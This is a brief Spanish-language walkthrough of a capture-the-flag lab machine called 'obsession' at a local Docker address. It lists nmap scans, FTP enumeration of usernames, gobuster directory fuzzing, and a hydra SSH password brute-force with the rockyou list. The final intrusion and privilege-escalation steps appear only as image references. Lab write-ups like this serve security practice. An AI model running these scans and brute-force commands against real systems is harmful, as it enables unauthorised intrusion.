### Maquina obsession

## Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

## Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p21,22,80 -vvv -Pn 172.17.0.2

![alt text](image.png)

## Entramos por fpt

ftp 172.17.0.2

![alt text](image-1.png)

del archivo chat-gonza.txt obtuvimos los usuarios gonza, nagora, russoski

del archivo pendientes.txt obtuvimos que un usuario tiene permisos SUID

## Visitando la web

obtuvimos el usuario russoski

## Fuzzing web

gobuster dir -t 200 -u http://172.17.0.2:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak,sh,py,js,html -r -b 403,404

en http://172.17.0.2/backup/backup.txt reafirmamos que existe el usuario russoski

## ataque con hydra

hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -I

![alt text](image-2.png)


## Intrusion y Escalar privilegios

![alt text](image-3.png)

